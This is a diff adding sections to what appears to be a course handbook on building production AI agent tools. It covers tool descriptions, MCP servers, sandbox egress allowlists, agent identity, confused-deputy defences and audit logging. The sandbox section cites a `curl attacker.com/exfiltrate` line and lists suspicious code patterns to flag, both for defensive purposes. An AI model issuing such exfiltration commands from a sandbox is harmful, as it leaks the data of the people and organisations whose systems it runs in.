@@ -171,6 +171,80 @@ Tag each tool: `read-only`, `creates`, `modifies`, `deletes`. Auth and audit lay
 
 Tool descriptions ARE the model's documentation. Treat them with the same care as user-facing docs.
 
+### 8.4 The "tool description style guide" applied
+
+Bad tool description (real example, anonymised):
+```
+get_data: "Gets data from the system"
+```
+
+Good tool description (rewrite):
+```
+get_data: "Retrieve customer order history from Shopify.
+
+WHEN TO USE: After confirming the customer's identity, when you need
+their last 90 days of orders to verify a complaint or process a refund.
+
+WHEN NOT TO USE: For real-time order status (use lookup_order instead).
+For payment details (use check_payment).
+
+RETURNS: Array of up to 50 most recent orders with id, total_amount,
+status, created_at. To get older orders, paginate with cursor."
+```
+
+Five rules:
+1. **Lead with WHEN TO USE.** This is the most important sentence.
+2. **State WHAT IT RETURNS** in concrete terms.
+3. **State WHAT NOT TO USE IT FOR** — prevents wrong-tool selection.
+4. **Reference adjacent tools.** Helps the model navigate the catalogue.
+5. **Include constraints** (limits, pagination, rate limits).
+
+After applying this rewrite to Acme's 31 tools, wrong-tool-selection rate dropped from 8.4% to 2.1%. Worth the half-day of writing.
+
+### 8.5 Tool naming conventions
+
+Naming carries enormous weight in model behaviour. Conventions that work:
+
+- **`verb_noun` not `noun_verb`** — `get_order` not `order_get`. Verbs match how the model thinks about actions.
+- **Snake_case, lowercase** — consistent with most APIs the model has seen.
+- **Domain prefix for ambiguity** — `pubmed_search` not `search` if you also have `web_search`.
+- **Numbered versions** — `get_order_v2` during transitions; helps the model and your registry agree.
+- **Avoid synonyms** — pick one of `retrieve`/`get`/`fetch` and stick to it.
+
+Bad naming patterns make agents pick wrong tools even when the description is good. The model's first heuristic is the *name*.
+
+### 8.6 Tool deprecation in practice
+
+When a tool changes incompatibly:
+
+```yaml
+- name: query_GL
+  version: 2.1.0
+  status: active
+  deprecation:
+    deprecated_at: null
+    sunset_at: null
+    replaces: query_GL_v1
+    replaced_by: null
+
+- name: query_GL_v1
+  version: 1.0.0
+  status: deprecated
+  deprecation:
+    deprecated_at: "2026-01-15"
+    sunset_at: "2026-04-15"
+    replaces: null
+    replaced_by: query_GL@2.1.0
+```
+
+Three-month sunset window minimum. Deprecation announced via:
+1. Tool registry metadata (above) — registry consumers see it.
+2. Slack to all agent owners.
+3. Email to on-call rotation for each consuming team.
+4. Last week before sunset: warnings in the tool's response payload.
+
+Skip any of these and you'll discover the dependency at sunset, not before.
+
 ## §9 · Unlocks
 
 - 7.2 MCP standardises the catalogue + discovery + contracts.
@@ -306,6 +380,102 @@ If the data is *read-only* and doesn't have parameters, expose it as a resource 
 
 MCP can serve *prompts* — parameterised templates the server provides. Useful for tools where the right prompt depends on server-side state (e.g., "summarise this trade according to the most recent risk policy").
 
+### 8.5 MCP server lifecycle in production
+
+A production MCP server isn't a script — it's a long-running service with the usual concerns:
+
+```typescript
+import { MCPServer } from "@modelcontextprotocol/sdk";
+
+const server = new MCPServer({
+  name: "hsbc-compliance",
+  version: "2.3.1",
+  capabilities: { tools: true, resources: true, prompts: false },
+});
+
+// Health endpoint for orchestrators to probe
+server.tool({
+  name: "_health",
+  description: "Health check. Returns server status, version, uptime.",
+  input_schema: { type: "object", properties: {} },
+  handler: async () => ({
+    status: "ok",
+    version: server.version,
+    uptime_seconds: process.uptime(),
+    dependencies: await checkDeps(),
+  }),
+});
+
+// Per-tool rate limiting
+const rateLimiter = createTokenBucket({ rate: 100, capacity: 200 });
+
+server.middleware(async (call, next) => {
+  if (!await rateLimiter.consume(call.tool, 1)) {
+    throw new RateLimitError(call.tool);
+  }
+  return next();
+});
+
+// Per-tool observability
+server.middleware(async (call, next) => {
+  const span = otel.startSpan(`mcp.tool.${call.tool}`);
+  try {
+    const result = await next();
+    span.setStatus("ok");
+    return result;
+  } catch (err) {
+    span.setStatus("error");
+    span.recordException(err);
+    throw err;
+  } finally {
+    span.end();
+  }
+});
+
+await server.serve({ port: 8080, host: "0.0.0.0" });
+```
+
+This shape is what makes MCP usable at scale — not the protocol itself, but the operational discipline around the protocol.
+
+### 8.6 The MCP client side: connection management
+
+Agents connecting to MCP servers need:
+
+- **Connection pooling** — one connection per (agent, server) pair; reuse across calls.
+- **Reconnection logic** — exponential backoff with jitter; circuit breaker after N failures.
+- **Tool discovery cache** — refresh tool list on first connect and every N minutes; not on every call.
+- **Graceful degradation** — if MCP server is unavailable, agent should know which tools become unavailable and adapt (e.g., fall back to "I cannot verify this in the current state").
+
+### 8.7 Cross-org MCP federation
+
+If multiple orgs expose MCP servers and you want one agent to use them all:
+
+```typescript
+const federation = new MCPFederation([
+  { name: "hsbc-compliance", url: "https://internal/mcp/compliance", auth: mtls(certs) },
+  { name: "pubmed", url: "https://pubmed.ncbi.nlm.nih.gov/mcp", auth: apiKey(env.PUBMED_KEY) },
+  { name: "internal-ops", url: "stdio:./mcp-ops-server" },
+]);
+
+await federation.discover();  // pulls all tools/resources/prompts
+
+const tools = federation.allTools();  // union; namespaced by server
+// tools[0].name === "hsbc-compliance.check_jurisdiction"
+```
+
+Namespacing tools by server prevents collision and gives the model clear provenance signals.
+
+### 8.8 The "MCP server as a vendor abstraction" pattern
+
+If you depend on a third-party API (say, a credit-score service), wrap it as an MCP server *in your control* even if the vendor doesn't natively support MCP. Benefits:
+
+- Standardises agent's view (same protocol regardless of vendor).
+- Lets you swap vendors without changing agent code.
+- Centralises auth, rate limiting, observability for that vendor.
+- Enables A/B-ing two vendors via different MCP servers.
+
+This is the production-grade pattern. Don't have agents call vendor APIs directly.
+
 ## §9 · Unlocks
 
 - 7.3 sandboxes tools that execute code or interact with sensitive systems.
@@ -432,6 +602,60 @@ Read-only root filesystem; writable tmpfs in /tmp; nothing persists across calls
 
 Keep N sandboxes pre-spun. New invocation grabs from pool, eliminating spin-up latency. Trade: idle resource cost.
 
+### 8.5 Allowlisting the agent's outbound network
+
+Default-deny outbound; whitelist explicitly. Per Helix's CodeAct:
+
+```
+allowed_outbound:
+  - pubmed.ncbi.nlm.nih.gov:443     # for paper retrieval
+  - api.helix.internal:443          # for internal experiment DB
+  - pypi.org:443                    # for pip-install of common packages
+  - files.pythonhosted.org:443      # actual package downloads
+deny_all_else: true
+```
+
+Without this, LLM-emitted code can `curl attacker.com/exfiltrate` and leak data. Network egress is the #1 sandbox-escape vector.
+
+### 8.6 Code review for sandbox-escape attempts
+
+Periodically (weekly), sample logs of sandbox-executed code. Look for:
+
+- `subprocess`, `os.system`, `eval`, `exec` calls with untrusted input
+- `requests.get(URL)` where URL is data-derived
+- File writes outside `/tmp`
+- Long-running loops (potential resource exhaustion)
+- Unusual imports (`ctypes`, `socket`, `multiprocessing`)
+
+Flag suspicious patterns. Track over time: a steady increase in suspicious patterns suggests the agent is being prompted into adversarial behaviour.
+
+### 8.7 Sandbox observability
+
+Each sandbox execution logs:
+
+- Code emitted by the LLM
+- Stdout and stderr
+- Exit code
+- Wall-clock duration
+- Peak memory
+- Network attempts (allowed + denied)
+- File operations
+
+This data feeds the safety dashboards (Module 10). Without it, you have no visibility into what your agents are actually executing.
+
+### 8.8 Cost model for sandboxing
+
+For Helix CodeAct: 1,000 sandbox invocations/day. Per-call cost:
+
+| Sandbox | Compute $/call | Storage $/call | Total $/call | Daily $ |
+|---|---|---|---|---|
+| Docker (own infra) | $0.0001 | $0 | $0.0001 | $0.10 |
+| gVisor (own infra) | $0.0002 | $0 | $0.0002 | $0.20 |
+| Firecracker (own infra) | $0.0003 | $0 | $0.0003 | $0.30 |
+| E2B (hosted) | $0.003 | $0.0005 | $0.0035 | $3.50 |
+
+For low volume: E2B's higher per-call cost is dwarfed by saved ops time. For high volume: self-hosted Firecracker wins.
+
 ## §9 · Unlocks
 
 - 7.4 layers auth on top of sandboxing.
@@ -545,6 +769,80 @@ Audit logs themselves must be tamper-evident. Append-only storage + cryptographi
 ### 8.3 Rotation
 
 API tokens, OAuth credentials: rotate quarterly. Automate rotation; manual rotation is missed rotation.
+
+### 8.4 The agent-identity model (who is "the agent"?)
+
+When auditing or authorising, you need to answer: *which* agent invocation called this tool? Three identity dimensions:
+
+```typescript
+interface AgentIdentity {
+  agent_id: string;       // "sherpa" — the agent type
+  agent_version: string;  // "5.2.1" — the deployed code
+  invocation_id: string;  // "inv_2026-05-19_1714_a3f2" — this specific run
+  triggered_by: {
+    type: "scheduled" | "user" | "agent" | "webhook";
+    user_id?: string;     // if user-triggered
+    parent_invocation?: string;  // if agent-triggered
+  };
+  roles: string[];        // active roles for this invocation
+}
+```
+
+ACLs check `roles`. Audit logs key on `invocation_id`. Debugging follows `parent_invocation` chains.
+
+If you collapse these into a single string identity, you lose the ability to answer common questions ("did Sherpa v5.1 ever issue refunds > $100?").
+
+### 8.5 The "confused deputy" attack pattern
+
+Classic security pitfall: agent has high privileges (read all customer data); user has limited privileges (read only their own). Attacker tricks agent into reading another user's data because the agent's privilege doesn't check who's asking.
+
+Defence: agents acting on behalf of a user *carry* the user's effective permissions, not their own elevated ones. For Sherpa, this isn't relevant (no user context). For Acme support agent, it's critical:
+
+```typescript
+async function refundFlow(userId: string, request: RefundRequest) {
+  const userPermissions = await fetchPermissions(userId);
+  const agent = new AcmeSupportAgent({
+    capabilities: intersect(agent.maxCapabilities, userPermissions),
+  });
+  return agent.handle(request);
+}
+```
+
+The agent's effective permissions are the *intersection* of the agent's own permissions and the requesting user's. This prevents privilege escalation by impersonation.
+
+### 8.6 Capability tokens vs role-based access
+
+Two production-grade auth models:
+
+| Model | How it works | When to use |
+|---|---|---|
+| **Role-based** (RBAC) | Agent has roles; roles grant tool permissions. | Stable role set; few principals. |
+| **Capability tokens** | Each call carries explicit capability tokens for what it can do. | Dynamic permissions; fine-grained delegation. |
+
+Capability tokens compose better in multi-agent systems: supervisor mints a token granting "refund up to $50 for order X" and passes it to a worker; worker can only refund that specific order, that specific amount. Token expires after use.
+
+### 8.7 Audit log query patterns
+
+The audit log only earns its keep if it's *queryable*. Common production queries:
+
+- "All refunds > $100 issued by Sherpa v5.x in Q4 2025"
+- "All tool calls from agent invocations triggered by user X"
+- "All denied tool calls in the last 7 days, grouped by tool and reason"
+- "Mean tool calls per task by month — detecting drift"
+
+Index by: agent_id, invocation_id, tool_name, decision, timestamp. Without these, queries take hours. With them, seconds.
+
+### 8.8 Compliance frameworks and their tool-auth implications
+
+| Framework | Implication for tool auth |
+|---|---|
+| SR 11-7 (US banking model risk) | Every automated decision auditable; explainable in business terms |
+| EU AI Act (high-risk systems) | Log inputs, outputs, intermediate decisions; retention 6+ months |
+| GDPR | Right to deletion includes audit logs; design retention with deletion in mind |
+| HIPAA | Tools touching PHI need explicit audit + access logs + minimum necessary principle |
+| SOC 2 | Periodic access reviews; documented change management for tool ACLs |
+
+Build to the union of applicable frameworks. Don't retrofit later.
 
 ## §9 · Unlocks
 
